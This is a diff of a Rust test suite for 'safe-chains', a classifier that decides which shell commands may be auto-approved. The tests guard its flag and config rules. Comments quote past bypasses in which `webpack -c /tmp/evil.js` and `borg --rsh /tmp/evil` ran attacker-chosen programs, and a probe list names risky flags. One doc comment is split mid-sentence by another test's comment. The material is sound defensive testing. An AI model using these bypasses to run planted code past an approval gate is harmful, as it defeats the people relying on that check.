+    // writes anything — it prints the entry, the path it belongs at, and the pin — so that
+    // reason is gone and it classifies as the read-only meta operation it now is. What made the
+    // old behaviour worth barring is unchanged and still barred: the pin lives in
+    // `~/.config/safe-chains.toml`, outside the worktree, and nothing here can author it.
+    const NOT_AUTO_APPROVED: &[&str] = &["setup", "tool", "auto-detect", "generate-book"];
+
+    let cmd = crate::cli::Cli::command();
+    let mut failures = Vec::new();
+    for arg in cmd.get_arguments() {
+        // A short-only flag must NOT be skipped — silently passing over an unclassified flag
+        // is the exact fail-open this guard exists to prevent, so spell it as `-x`.
+        let spelling = match (arg.get_long(), arg.get_short()) {
+            (Some(long), _) => format!("--{long}"),
+            (None, Some(short)) => format!("-{short}"),
+            (None, None) => continue, // a positional, not a flag
+        };
+        // --help/--version short-circuit in clap before classification is meaningful.
+        if spelling == "--help" || spelling == "--version" {
+            continue;
+        }
+        let long = spelling.trim_start_matches('-');
+        let takes_value = arg.get_num_args().is_none_or(|r| r.takes_values());
+        let invocation = if takes_value { format!("safe-chains {spelling} X 'ls'") } else { format!("safe-chains {spelling} 'ls'") };
+        let allowed = crate::is_safe_command(&invocation);
+        let intended = !NOT_AUTO_APPROVED.contains(&long);
+        if allowed != intended {
+            failures.push(format!(
+                "--{long}: classifies {} but {} ({invocation:?})",
+                if allowed { "SAFE" } else { "denied" },
+                if intended { "commands/tools/safe-chains.toml does not list it" } else { "it is declared NOT_AUTO_APPROVED" },
+            ));
+        }
+    }
+    assert!(failures.is_empty(), "safe-chains' own CLI flags drift from its command spec:\n{}", failures.join("\n"),);
+}
+
+/// GLOBAL guard for the `verb-chain` primitive — enumerated over the registry so any future
+/// verb-chain command is covered automatically, not just mlr. For every such command:
+///   1. every allowlisted verb classifies safe (bare, and after the `then` separator);
+///   2. a non-allowlisted verb denies (bare, and after the separator) — the fail-closed rule
+///      that keeps `put`/`filter`/`split`/`tee` and any unknown/newer verb out;
+///   3. an UNKNOWN main flag denies at EVERY position in the main region. This is the
+///      generalized form of the `mlr --from data.csv -I cat` in-place hole: the strict
+///      allowlist catches ANY unlisted main flag (a future mutating flag included), wherever
+///      it sits, with no hand-maintained denylist.
+#[test]
+fn verb_chain_grammar_is_enforced_across_the_registry() {
+    const BOGUS_VERB: &str = "sc-nonexistent-verb-zzz";
+    const BOGUS_FLAG: &str = "--sc-nonexistent-main-flag-zzz";
+    let mut checked = 0;
+    for (name, spec) in TOML_REGISTRY.iter() {
+        if name != &spec.name {
+            continue; // canonical only
+        }
+        let DispatchKind::VerbChain(vc) = &spec.kind else {
+            continue;
+        };
+        checked += 1;
+        let cmd = &spec.name;
+        let sep = &vc.separator;
+        let first = vc.verbs.iter().next().expect("a verb-chain command declares ≥1 verb");
+
+        for verb in &vc.verbs {
+            assert!(crate::is_safe_command(&format!("{cmd} {verb}")), "{cmd}: allowlisted verb `{verb}` denied");
+            assert!(
+                crate::is_safe_command(&format!("{cmd} {first} {sep} {verb}")),
+                "{cmd}: allowlisted verb `{verb}` denied after `{sep}`"
+            );
+        }
+
+        assert!(!crate::is_safe_command(&format!("{cmd} {BOGUS_VERB}")), "{cmd}: non-allowlisted verb allowed (bare)");
+        assert!(!crate::is_safe_command(&format!("{cmd} {first} {sep} {BOGUS_VERB}")), "{cmd}: non-allowlisted verb allowed after `{sep}`");
+
+        let real: Vec<&str> = vc.main_standalone.iter().take(3).map(String::as_str).collect();
+        for at in 0..=real.len() {
+            let mut main = real.clone();
+            main.insert(at, BOGUS_FLAG);
+            let line = format!("{cmd} {} {first}", main.join(" "));
+            assert!(!crate::is_safe_command(&line), "{cmd}: unknown main flag allowed at position {at}: `{line}`");
+        }
+    }
+    assert!(checked >= 1, "no verb-chain commands exercised — vacuous guard");
+}
+
+/// Regression guard: `examples_safe`/`examples_denied` must appear
+/// before any `[[command.sub]]` or `[command.fallback]` table in
+/// each TOML file. TOML semantics scope inline keys to the
+/// On a tool whose CONFIG FILE IS CODE, every config-selecting flag must be gated at the
+/// executor locus.
+///
+/// This is the half no name rule can find: the flag is called `--config`, and the file it names
+/// is a program the tool runs. The usable predicate is the TOOL — a runner whose config format
+/// is executable — so the fact is declared here, per tool, and the guard derives the obligation.
+/// Every entry below was a live fail-open when it was added: `webpack -c /tmp/evil.js` and
+/// `marp --config-file /tmp/evil.js` auto-approved and ran that file.
+///
+/// The point of the table is that ADDING a config flag to a listed tool now fails until it is
+/// gated, instead of waiting for someone to think of that tool again.
+#[test]
+fn a_config_flag_on_a_code_config_tool_is_gated() {
+    use std::fs;
+    use std::path::PathBuf;
+
+    /// Tools whose config file is executed, with the reason. Grows as tools are researched.
+    const CONFIG_IS_CODE: &[(&str, &str)] = &[
+        ("webpack", "webpack.config.js is JavaScript webpack evaluates"),
+        ("vite", "a vite config is JavaScript vite evaluates"),
+        ("eslint", "eslint.config.js / .eslintrc.js is JavaScript"),
+        ("stylelint", "stylelint.config.js is JavaScript"),
+        ("marp", "marp.config.js / .marprc.js is JavaScript Node executes"),
+        ("nox", "a noxfile is Python nox imports and runs"),
+        ("sphinx-build", "the conf dir holds conf.py, executed as Python"),
+        ("mkdocs", "mkdocs.yml can declare `hooks:` Python modules"),
+    ];
+
+    /// A flag that SELECTS the config (or the engine/formatter module loaded with it).
+    fn selects_config(flag: &str) -> bool {
+        let f = flag.trim_start_matches('-');
+        f == "c"
+            || f == "config"
+            || f == "config-file"
+            || f == "noxfile"
+            || f == "conf-dir"
+            || f == "engine"
+            || f == "format"
+            || f == "formatter"
     }
 
-    /// A flag is researched FOR A COMMAND, never in general. The same spelling means opposite things
-    /// on different commands — `--api-key` NAMES the key to read on `aws apigateway get-api-key`,
-    /// but SUPPLIES the caller's credential on `neon`. So a flag may only be accepted where it was
-    /// declared, and the guard walks the REAL registry so every present and future profiled sub is
-    /// covered without anyone remembering to extend a list.
-    ///
-    /// This exists because the opposite practice was shipped and had to be reverted: one generic
-    /// "global options" list pasted into every sub of a CLI, which asserted ~200 flags as researched
-    /// that nobody had looked at — including endpoint-redirect (`--endpoint-url`) and credential-
-    /// substitution (`--profile`) flags on subs that auto-approve. An omitted flag merely denies; a
-    /// wrongly-asserted one claims research that never happened.
-    #[test]
-    fn a_profiled_sub_accepts_only_flags_declared_for_that_sub() {
-        // Spellings that are plausible on SOME command, so a stray acceptance means the sub is not
-        // really consulting its own declaration.
-        const PROBES: &[&str] = &[
-            "--frobnicate", "--endpoint-url", "--profile", "--api-key", "--token", "--host",
-            "--no-verify-ssl", "--force", "--exec", "--output", "--all",
-        ];
-        let mut leaks = Vec::new();
-        for (name, spec) in TOML_REGISTRY.iter() {
-            if name != &spec.name {
-                continue; // alias entries share the canonical spec
+    fn walk(dir: &std::path::Path, out: &mut Vec<PathBuf>) {
+        for entry in fs::read_dir(dir).unwrap() {
+            let entry = entry.unwrap();
+            let path = entry.path();
+            if path.is_dir() {
+                walk(&path, out);
+            } else if path.extension().and_then(|e| e.to_str()) == Some("toml")
+                && path.file_name().and_then(|n| n.to_str()) != Some("SAMPLE.toml")
+            {
+                out.push(path);
             }
-            walk_profiled(&spec.kind, &mut vec![spec.name.clone()], &mut |path, sub| {
-                // A sub that explicitly declares unbounded tolerance is opting out BY DECLARATION;
-                // that is the (a)-class problem tracked in TODO.md, not this guard's business.
-                if !matches!(sub.allowed_unknown, crate::policy::UnknownTolerance::Strict) {
-                    return;
-                }
-                for probe in PROBES {
-                    let declared = sub.allowed_standalone.iter().any(|f| f == probe)
-                        || sub.allowed_valued.iter().any(|f| f == probe)
-                        || sub.flags.iter().any(|f| f.name == *probe)
-                        || sub.output_path_flags.iter().any(|f| f == probe)
-                        || sub.destination_flag.as_deref() == Some(*probe);
-                    if declared {
+        }
+    }
+
+    let mut files = Vec::new();
+    walk(std::path::Path::new("commands"), &mut files);
+    let mut seen: Vec<&str> = Vec::new();
+    let mut checked = 0;
+    let mut failures = Vec::new();
+
+    for path in &files {
+        let Ok(parsed) = toml::from_str::<toml::Value>(&fs::read_to_string(path).unwrap()) else {
+            continue;
+        };
+        let Some(commands) = parsed.get("command").and_then(|c| c.as_array()) else { continue };
+        for cmd in commands {
+            let name = cmd.get("name").and_then(|n| n.as_str()).unwrap_or("");
+            let Some((tool, why)) = CONFIG_IS_CODE.iter().find(|(t, _)| *t == name) else {
+                continue;
+            };
+            seen.push(tool);
+            let gate = cmd.get("path_gate").and_then(|g| g.get("flags"));
+            // Sub-scopes carry their own `valued`; a config flag on any of them counts.
+            let mut scopes = vec![cmd.clone()];
+            if let Some(subs) = cmd.get("sub").and_then(|s| s.as_array()) {
+                scopes.extend(subs.iter().cloned());
+            }
+            for scope in scopes {
+                let Some(valued) = scope.get("valued").and_then(|v| v.as_array()) else {
+                    continue;
+                };
+                for flag in valued.iter().filter_map(|f| f.as_str()) {
+                    if !selects_config(flag) {
                         continue;
                     }
-                    let cmd = format!("{} {probe} x", path.join(" "));
-                    if crate::is_safe_command(&cmd) {
-                        leaks.push(format!("{cmd:?} — `{probe}` is not declared for this sub"));
+                    checked += 1;
+                    let role = gate.and_then(|g| g.get(flag)).and_then(|r| r.as_str());
+                    if role != Some("exec") {
+                        failures.push(format!(
+                            "{}: `{name} {flag}` selects config on a tool where config is CODE \
+                                 ({why}), but its path_gate role is {role:?} — needs \"exec\"",
+                            path.display()
+                        ));
                     }
                 }
-            });
-        }
-        assert!(
-            leaks.is_empty(),
-            "profiled sub accepted a flag it never declared ({} case(s)):\n  {}",
-            leaks.len(),
-            leaks.join("\n  "),
-        );
-    }
-
-    /// Visit every profiled sub, carrying the token path that reaches it.
-    fn walk_profiled(
-        kind: &'static crate::registry::types::DispatchKind,
-        path: &mut Vec<String>,
-        f: &mut impl FnMut(&[String], &'static crate::registry::types::SubSpec),
-    ) {
-        use crate::registry::types::DispatchKind as D;
-        let subs = match kind {
-            D::Branching { subs, .. } | D::Custom { subs, .. } => subs,
-            _ => return,
-        };
-        for sub in subs {
-            path.push(sub.name.clone());
-            if sub.profile.is_some() {
-                f(path, sub);
             }
-            walk_profiled(&sub.kind, path, f);
-            path.pop();
+        }
+    }
+    for (tool, _) in CONFIG_IS_CODE {
+        assert!(seen.contains(tool), "CONFIG_IS_CODE lists `{tool}`, which no TOML defines");
+    }
+    assert!(checked > 0, "no config flag was examined; guard is vacuous");
+    assert!(failures.is_empty(), "ungated config-as-code flags:\n  {}", failures.join("\n  "));
+}
+
+/// A flag whose NAME says its value is a program must gate that value at the EXECUTOR locus.
+///
+/// `dispatch_wrapper` consumes a valued flag and never looks at the value, so a flag naming a
+/// program auto-approved any path — `borg --rsh /tmp/evil check repo` ran `/tmp/evil`. `read`
+/// or `write` is not enough: both ADMIT `/tmp`, which is exactly where a fetched script lands.
+/// Only `exec` withholds it.
+///
+/// Walks EVERY place a `valued` list can appear — the command, its wrapper, its fallback and
+/// each sub. The first version walked only the wrapper: 307 flags of ~14,600, which is how
+/// `rsync --rsh` and six more stayed ungated while the guard passed.
+///
+/// A ratchet over names, so a flag added later inherits the requirement. It cannot
+/// catch a flag whose name does not advertise what it does (`vite --config` evaluates
+/// JavaScript, `sandbox-exec -f` picks the sandbox profile) — those are gated, but by research,
+/// not by this guard. The behavioural corpus below pins them.
+#[test]
+fn an_executor_named_flag_is_gated_at_the_executor_locus() {
+    use std::fs;
+    use std::path::PathBuf;
+
+    /// Flags the NAME rule catches whose value is not a program at all. Reviewed individually;
+    /// gating these would be a false claim and would break the legitimate spelling. The list
+    /// may only shrink.
+    const NOT_A_PROGRAM: &[(&str, &str, &str)] = &[
+        ("fossil diff", "--diff-binary", "a BOOLEAN: whether to diff binary files"),
+        ("git cat-file", "--batch-command", "a MODE: read commands from stdin"),
+        ("pip install", "--no-binary", "package selectors like `:all:`, not paths"),
+        ("pip install", "--only-binary", "package selectors like `:all:`, not paths"),
+        ("pip download", "--no-binary", "package selectors like `:all:`, not paths"),
+        ("pip download", "--only-binary", "package selectors like `:all:`, not paths"),
+        ("mysqldump", "--init-command", "SQL run by the SERVER, not a local program"),
+        ("xcodebuild", "-find-executable", "PRINTS the path of a named tool; runs nothing"),
+    ];
+
+    fn walk(dir: &std::path::Path, out: &mut Vec<PathBuf>) {
+        for entry in fs::read_dir(dir).unwrap() {
+            let entry = entry.unwrap();
+            let path = entry.path();
+            if path.is_dir() {
+                walk(&path, out);
+            } else if path.extension().and_then(|e| e.to_str()) == Some("toml")
+                && path.file_name().and_then(|n| n.to_str()) != Some("SAMPLE.toml")
+            {
+                out.push(path);
+            }
         }
     }
 
-    /// safe-chains must know its OWN command-line surface. Every flag clap defines is enumerated
-    /// from the parser itself, so a flag added to `cli.rs` and forgotten in
-    /// `commands/tools/safe-chains.toml` fails here instead of silently denying the tool's own
-    /// invocation (which is exactly what happened when `--session-id` was added).
-    ///
-    /// Fail-closed by construction: a NEW flag must either classify safe or be declared in
-    /// `NOT_AUTO_APPROVED` with a reason. Doing nothing is not an option the guard permits.
-    #[test]
-    fn safe_chains_knows_its_own_cli_flags() {
-        use clap::CommandFactory;
+    fn names_an_executor(flag: &str) -> bool {
+        let f = flag.trim_start_matches('-');
+        f == "rsh"
+            || f.ends_with("-binary")
+            || f.ends_with("-command")
+            || f.ends_with("-interpreter")
+            || f.ends_with("-shell")
+            || f.ends_with("-executable")
+    }
 
-        // Flags whose effect is deliberately NOT auto-approved: they write another tool's config
-        // (`--setup`/`--tool`/`--auto-detect`) or generate files (`--generate-book`). Listing them
-        // here records the intent, so a flag is never merely *forgotten*.
-        //
-        // `--suggest` was here too, for writing "the very file that grants trust". It no longer
-        // writes anything — it prints the entry, the path it belongs at, and the pin — so that
-        // reason is gone and it classifies as the read-only meta operation it now is. What made the
-        // old behaviour worth barring is unchanged and still barred: the pin lives in
-        // `~/.config/safe-chains.toml`, outside the worktree, and nothing here can author it.
-        const NOT_AUTO_APPROVED: &[&str] = &["setup", "tool", "auto-detect", "generate-book"];
+    fn valued_of(v: &toml::Value) -> Vec<String> {
+        v.get("valued")
+            .and_then(|x| x.as_array())
+            .map(|a| a.iter().filter_map(|f| f.as_str().map(String::from)).collect())
+            .unwrap_or_default()
+    }
 
-        let cmd = crate::cli::Cli::command();
-        let mut failures = Vec::new();
-        for arg in cmd.get_arguments() {
-            // A short-only flag must NOT be skipped — silently passing over an unclassified flag
-            // is the exact fail-open this guard exists to prevent, so spell it as `-x`.
-            let spelling = match (arg.get_long(), arg.get_short()) {
-                (Some(long), _) => format!("--{long}"),
-                (None, Some(short)) => format!("-{short}"),
-                (None, None) => continue, // a positional, not a flag
-            };
-            // --help/--version short-circuit in clap before classification is meaningful.
-            if spelling == "--help" || spelling == "--version" {
+    fn gate_of(v: &toml::Value, flag: &str) -> Option<String> {
+        v.get("path_gate")
+            .and_then(|g| g.get("flags"))
+            .and_then(|f| f.get(flag))
+            .and_then(|r| r.as_str())
+            .map(String::from)
+    }
+
+    let mut files = Vec::new();
+    walk(std::path::Path::new("commands"), &mut files);
+    assert!(!files.is_empty(), "expected commands/ to contain TOML files");
+
+    let mut checked = 0;
+    let mut failures = Vec::new();
+    for path in &files {
+        let source = fs::read_to_string(path).unwrap();
+        let Ok(parsed) = toml::from_str::<toml::Value>(&source) else { continue };
+        let Some(commands) = parsed.get("command").and_then(|c| c.as_array()) else { continue };
+        for cmd in commands {
+            let name = cmd.get("name").and_then(|n| n.as_str()).unwrap_or("?").to_string();
+
+            // Every place a `valued` list can appear: the command itself, its wrapper, its
+            // fallback grammar, and each sub. The first version of this guard walked ONLY the
+            // wrapper — 307 flags out of the ~14,600 that exist — so `rsync --rsh`,
+            // `gotestsum --raw-command` and five more sat outside it, ungated.
+            let mut scopes: Vec<(String, &toml::Value)> = vec![(name.clone(), cmd)];
+            for key in ["wrapper", "fallback"] {
+                if let Some(v) = cmd.get(key) {
+                    scopes.push((name.clone(), v));
+                }
+            }
+            if let Some(subs) = cmd.get("sub").and_then(|s| s.as_array()) {
+                for sub in subs {
+                    let sname = sub.get("name").and_then(|n| n.as_str()).unwrap_or("?");
+                    scopes.push((format!("{name} {sname}"), sub));
+                }
+            }
+
+            for (label, scope) in scopes {
+                for flag in valued_of(scope) {
+                    if !names_an_executor(&flag) {
+                        continue;
+                    }
+                    if NOT_A_PROGRAM.iter().any(|(c, f, _)| *c == label && *f == flag) {
+                        continue;
+                    }
+                    checked += 1;
+                    let role = gate_of(scope, &flag).or_else(|| gate_of(cmd, &flag));
+                    if role.as_deref() != Some("exec") {
+                        failures.push(format!(
+                            "{}: `{label} {flag}` names a program but its path_gate role is \
+                                 {role:?} (needs \"exec\"; read/write would admit /tmp). If its \
+                                 value is NOT a program, add it to NOT_A_PROGRAM with the reason.",
+                            path.display()
+                        ));
+                    }
+                }
+            }
+        }
+    }
+    assert!(checked > 0, "no executor-named flag was examined; guard is vacuous");
+    assert!(failures.is_empty(), "ungated executor flags:\n  {}", failures.join("\n  "));
+}
+
+/// most-recently-opened table, so examples written *after* a
+/// nested table silently get attached to that table and dropped
+/// from the command. Walks every `commands/**/*.toml` and asserts
+/// each `[[command]]` block that mentions an `examples_*` field
+/// produces a non-empty list on the parsed spec.
+#[test]
+fn examples_appear_before_nested_tables_in_every_toml() {
+    use std::fs;
+    use std::path::PathBuf;
+
+    fn walk(dir: &std::path::Path, out: &mut Vec<PathBuf>) {
+        for entry in fs::read_dir(dir).unwrap() {
+            let entry = entry.unwrap();
+            let path = entry.path();
+            if path.is_dir() {
+                walk(&path, out);
+            } else if path.extension().and_then(|e| e.to_str()) == Some("toml") {
+                if path.file_name().and_then(|n| n.to_str()) == Some("SAMPLE.toml") {
+                    continue;
+                }
+                out.push(path);
+            }
+        }
+    }
+
+    let mut files = Vec::new();
+    walk(std::path::Path::new("commands"), &mut files);
+    assert!(!files.is_empty(), "expected commands/ to contain TOML files");
+
+    let mut failures = Vec::new();
+    for path in files {
+        let source = fs::read_to_string(&path).unwrap();
+        let parsed: toml::Value = match toml::from_str(&source) {
+            Ok(v) => v,
+            Err(e) => {
+                failures.push(format!("{}: parse error: {e}", path.display()));
                 continue;
             }
-            let long = spelling.trim_start_matches('-');
-            let takes_value = arg.get_num_args().is_none_or(|r| r.takes_values());
-            let invocation = if takes_value {
-                format!("safe-chains {spelling} X 'ls'")
-            } else {
-                format!("safe-chains {spelling} 'ls'")
+        };
+        let Some(cmds) = parsed.get("command").and_then(|v| v.as_array()) else {
+            continue;
+        };
+        for cmd in cmds {
+            let Some(name) = cmd.get("name").and_then(|v| v.as_str()) else {
+                continue;
             };
-            let allowed = crate::is_safe_command(&invocation);
-            let intended = !NOT_AUTO_APPROVED.contains(&long);
-            if allowed != intended {
+            if source.contains("examples_safe") && cmd.get("examples_safe").is_none() {
                 failures.push(format!(
-                    "--{long}: classifies {} but {} ({invocation:?})",
-                    if allowed { "SAFE" } else { "denied" },
-                    if intended {
-                        "commands/tools/safe-chains.toml does not list it"
-                    } else {
-                        "it is declared NOT_AUTO_APPROVED"
-                    },
+                    "{}: command `{name}` — `examples_safe` text in file but \
+                         not attached to [[command]] (move it above any \
+                         [[command.sub]] / [command.fallback] table)",
+                    path.display(),
+                ));
+            }
+            if source.contains("examples_denied") && cmd.get("examples_denied").is_none() {
+                failures.push(format!(
+                    "{}: command `{name}` — `examples_denied` text in file \
+                         but not attached to [[command]] (move it above any \
+                         [[command.sub]] / [command.fallback] table)",
+                    path.display(),
                 ));
             }
         }
-        assert!(
-            failures.is_empty(),
-            "safe-chains' own CLI flags drift from its command spec:\n{}",
-            failures.join("\n"),
-        );
+    }
+    assert!(failures.is_empty(), "TOML examples misordered:\n{}", failures.join("\n"),);
+}
+
+/// No two `[[command]]` blocks across all TOMLs may share a `name`. A duplicate is silently
+/// deduped at build time (one definition wins, order-dependently), so a second entry can
+/// shadow a carefully-scoped one with NO warning — exactly how a full path-gated `sips` in
+/// `media/` once collided with an older Inert-only `sips` in `binary/`. Walks every
+/// `commands/**/*.toml` and fails on any name defined more than once.
+#[test]
+fn no_command_name_is_defined_twice() {
+    use std::collections::HashMap;
+    use std::fs;
+    use std::path::PathBuf;
+
+    fn walk(dir: &std::path::Path, out: &mut Vec<PathBuf>) {
+        for entry in fs::read_dir(dir).unwrap() {
+            let path = entry.unwrap().path();
+            if path.is_dir() {
+                walk(&path, out);
+            } else if path.extension().and_then(|e| e.to_str()) == Some("toml")
+                && path.file_name().and_then(|n| n.to_str()) != Some("SAMPLE.toml")
+            {
+                out.push(path);
+            }
+        }
     }
 
-    /// GLOBAL guard for the `verb-chain` primitive — enumerated over the registry so any future
-    /// verb-chain command is covered automatically, not just mlr. For every such command:
-    ///   1. every allowlisted verb classifies safe (bare, and after the `then` separator);
-    ///   2. a non-allowlisted verb denies (bare, and after the separator) — the fail-closed rule
-    ///      that keeps `put`/`filter`/`split`/`tee` and any unknown/newer verb out;
-    ///   3. an UNKNOWN main flag denies at EVERY position in the main region. This is the
-    ///      generalized form of the `mlr --from data.csv -I cat` in-place hole: the strict
-    ///      allowlist catches ANY unlisted main flag (a future mutating flag included), wherever
-    ///      it sits, with no hand-maintained denylist.
-    #[test]
-    fn verb_chain_grammar_is_enforced_across_the_registry() {
-        const BOGUS_VERB: &str = "sc-nonexistent-verb-zzz";
-        const BOGUS_FLAG: &str = "--sc-nonexistent-main-flag-zzz";
-        let mut checked = 0;
-        for (name, spec) in TOML_REGISTRY.iter() {
-            if name != &spec.name {
-                continue; // canonical only
-            }
-            let DispatchKind::VerbChain(vc) = &spec.kind else {
+    let mut files = Vec::new();
+    walk(std::path::Path::new("commands"), &mut files);
+    assert!(!files.is_empty(), "expected commands/ to contain TOML files");
+    files.sort();
+
+    let mut owner: HashMap<String, PathBuf> = HashMap::new();
+    let mut dups = Vec::new();
+    for path in &files {
+        let src = fs::read_to_string(path).unwrap();
+        let parsed: toml::Value = toml::from_str(&src).unwrap_or_else(|e| panic!("{}: parse error: {e}", path.display()));
+        let Some(cmds) = parsed.get("command").and_then(|v| v.as_array()) else {
+            continue;
+        };
+        for cmd in cmds {
+            let Some(name) = cmd.get("name").and_then(|v| v.as_str()) else {
                 continue;
             };
-            checked += 1;
-            let cmd = &spec.name;
-            let sep = &vc.separator;
-            let first = vc.verbs.iter().next().expect("a verb-chain command declares ≥1 verb");
-
-            for verb in &vc.verbs {
-                assert!(crate::is_safe_command(&format!("{cmd} {verb}")),
-                    "{cmd}: allowlisted verb `{verb}` denied");
-                assert!(crate::is_safe_command(&format!("{cmd} {first} {sep} {verb}")),
-                    "{cmd}: allowlisted verb `{verb}` denied after `{sep}`");
-            }
-
-            assert!(!crate::is_safe_command(&format!("{cmd} {BOGUS_VERB}")),
-                "{cmd}: non-allowlisted verb allowed (bare)");
-            assert!(!crate::is_safe_command(&format!("{cmd} {first} {sep} {BOGUS_VERB}")),
-                "{cmd}: non-allowlisted verb allowed after `{sep}`");
-
-            let real: Vec<&str> = vc.main_standalone.iter().take(3).map(String::as_str).collect();
-            for at in 0..=real.len() {
-                let mut main = real.clone();
-                main.insert(at, BOGUS_FLAG);
-                let line = format!("{cmd} {} {first}", main.join(" "));
-                assert!(!crate::is_safe_command(&line),
-                    "{cmd}: unknown main flag allowed at position {at}: `{line}`");
+            match owner.get(name) {
+                Some(prev) => dups.push(format!("`{name}` defined in both {} and {}", prev.display(), path.display())),
+                None => {
+                    owner.insert(name.to_string(), path.clone());
+                }
             }
         }
-        assert!(checked >= 1, "no verb-chain commands exercised — vacuous guard");
     }
+    assert!(dups.is_empty(), "duplicate command names:\n{}", dups.join("\n"));
+}
 
-    /// Regression guard: `examples_safe`/`examples_denied` must appear
-    /// before any `[[command.sub]]` or `[command.fallback]` table in
-    /// each TOML file. TOML semantics scope inline keys to the
-    /// On a tool whose CONFIG FILE IS CODE, every config-selecting flag must be gated at the
-    /// executor locus.
-    ///
-    /// This is the half no name rule can find: the flag is called `--config`, and the file it names
-    /// is a program the tool runs. The usable predicate is the TOOL — a runner whose config format
-    /// is executable — so the fact is declared here, per tool, and the guard derives the obligation.
-    /// Every entry below was a live fail-open when it was added: `webpack -c /tmp/evil.js` and
-    /// `marp --config-file /tmp/evil.js` auto-approved and ran that file.
-    ///
-    /// The point of the table is that ADDING a config flag to a listed tool now fails until it is
-    /// gated, instead of waiting for someone to think of that tool again.
-    #[test]
-    fn a_config_flag_on_a_code_config_tool_is_gated() {
-        use std::fs;
-        use std::path::PathBuf;
-
-        /// Tools whose config file is executed, with the reason. Grows as tools are researched.
-        const CONFIG_IS_CODE: &[(&str, &str)] = &[
-            ("webpack", "webpack.config.js is JavaScript webpack evaluates"),
-            ("vite", "a vite config is JavaScript vite evaluates"),
-            ("eslint", "eslint.config.js / .eslintrc.js is JavaScript"),
-            ("stylelint", "stylelint.config.js is JavaScript"),
-            ("marp", "marp.config.js / .marprc.js is JavaScript Node executes"),
-            ("nox", "a noxfile is Python nox imports and runs"),
-            ("sphinx-build", "the conf dir holds conf.py, executed as Python"),
-            ("mkdocs", "mkdocs.yml can declare `hooks:` Python modules"),
-        ];
-
-        /// A flag that SELECTS the config (or the engine/formatter module loaded with it).
-        fn selects_config(flag: &str) -> bool {
-            let f = flag.trim_start_matches('-');
-            f == "c" || f == "config" || f == "config-file" || f == "noxfile"
-                || f == "conf-dir" || f == "engine" || f == "format" || f == "formatter"
-        }
-
-        fn walk(dir: &std::path::Path, out: &mut Vec<PathBuf>) {
-            for entry in fs::read_dir(dir).unwrap() {
-                let entry = entry.unwrap();
-                let path = entry.path();
-                if path.is_dir() {
-                    walk(&path, out);
-                } else if path.extension().and_then(|e| e.to_str()) == Some("toml")
-                    && path.file_name().and_then(|n| n.to_str()) != Some("SAMPLE.toml")
-                {
-                    out.push(path);
-                }
-            }
-        }
-
-        let mut files = Vec::new();
-        walk(std::path::Path::new("commands"), &mut files);
-        let mut seen: Vec<&str> = Vec::new();
-        let mut checked = 0;
-        let mut failures = Vec::new();
-
-        for path in &files {
-            let Ok(parsed) = toml::from_str::<toml::Value>(&fs::read_to_string(path).unwrap())
-            else {
-                continue;
-            };
-            let Some(commands) = parsed.get("command").and_then(|c| c.as_array()) else { continue };
-            for cmd in commands {
-                let name = cmd.get("name").and_then(|n| n.as_str()).unwrap_or("");
-                let Some((tool, why)) = CONFIG_IS_CODE.iter().find(|(t, _)| *t == name) else {
-                    continue;
-                };
-                seen.push(tool);
-                let gate = cmd.get("path_gate").and_then(|g| g.get("flags"));
-                // Sub-scopes carry their own `valued`; a config flag on any of them counts.
-                let mut scopes = vec![cmd.clone()];
-                if let Some(subs) = cmd.get("sub").and_then(|s| s.as_array()) {
-                    scopes.extend(subs.iter().cloned());
-                }
-                for scope in scopes {
-                    let Some(valued) = scope.get("valued").and_then(|v| v.as_array()) else {
-                        continue;
-                    };
-                    for flag in valued.iter().filter_map(|f| f.as_str()) {
-                        if !selects_config(flag) {
-                            continue;
-                        }
-                        checked += 1;
-                        let role = gate.and_then(|g| g.get(flag)).and_then(|r| r.as_str());
-                        if role != Some("exec") {
-                            failures.push(format!(
-                                "{}: `{name} {flag}` selects config on a tool where config is CODE \
-                                 ({why}), but its path_gate role is {role:?} — needs \"exec\"",
-                                path.display()
-                            ));
-                        }
-                    }
-                }
-            }
-        }
-        for (tool, _) in CONFIG_IS_CODE {
-            assert!(seen.contains(tool), "CONFIG_IS_CODE lists `{tool}`, which no TOML defines");
-        }
-        assert!(checked > 0, "no config flag was examined; guard is vacuous");
-        assert!(failures.is_empty(), "ungated config-as-code flags:\n  {}", failures.join("\n  "));
-    }
-
-    /// A flag whose NAME says its value is a program must gate that value at the EXECUTOR locus.
-    ///
-    /// `dispatch_wrapper` consumes a valued flag and never looks at the value, so a flag naming a
-    /// program auto-approved any path — `borg --rsh /tmp/evil check repo` ran `/tmp/evil`. `read`
-    /// or `write` is not enough: both ADMIT `/tmp`, which is exactly where a fetched script lands.
-    /// Only `exec` withholds it.
-    ///
-    /// Walks EVERY place a `valued` list can appear — the command, its wrapper, its fallback and
-    /// each sub. The first version walked only the wrapper: 307 flags of ~14,600, which is how
-    /// `rsync --rsh` and six more stayed ungated while the guard passed.
-    ///
-    /// A ratchet over names, so a flag added later inherits the requirement. It cannot
-    /// catch a flag whose name does not advertise what it does (`vite --config` evaluates
-    /// JavaScript, `sandbox-exec -f` picks the sandbox profile) — those are gated, but by research,
-    /// not by this guard. The behavioural corpus below pins them.
-    #[test]
-    fn an_executor_named_flag_is_gated_at_the_executor_locus() {
-        use std::fs;
-        use std::path::PathBuf;
-
-        /// Flags the NAME rule catches whose value is not a program at all. Reviewed individually;
-        /// gating these would be a false claim and would break the legitimate spelling. The list
-        /// may only shrink.
-        const NOT_A_PROGRAM: &[(&str, &str, &str)] = &[
-            ("fossil diff", "--diff-binary", "a BOOLEAN: whether to diff binary files"),
-            ("git cat-file", "--batch-command", "a MODE: read commands from stdin"),
-            ("pip install", "--no-binary", "package selectors like `:all:`, not paths"),
-            ("pip install", "--only-binary", "package selectors like `:all:`, not paths"),
-            ("pip download", "--no-binary", "package selectors like `:all:`, not paths"),
-            ("pip download", "--only-binary", "package selectors like `:all:`, not paths"),
-            ("mysqldump", "--init-command", "SQL run by the SERVER, not a local program"),
-            ("xcodebuild", "-find-executable", "PRINTS the path of a named tool; runs nothing"),
-        ];
-
-        fn walk(dir: &std::path::Path, out: &mut Vec<PathBuf>) {
-            for entry in fs::read_dir(dir).unwrap() {
-                let entry = entry.unwrap();
-                let path = entry.path();
-                if path.is_dir() {
-                    walk(&path, out);
-                } else if path.extension().and_then(|e| e.to_str()) == Some("toml")
-                    && path.file_name().and_then(|n| n.to_str()) != Some("SAMPLE.toml")
-                {
-                    out.push(path);
-                }
-            }
-        }
-
-        fn names_an_executor(flag: &str) -> bool {
-            let f = flag.trim_start_matches('-');
-            f == "rsh"
-                || f.ends_with("-binary")
-                || f.ends_with("-command")
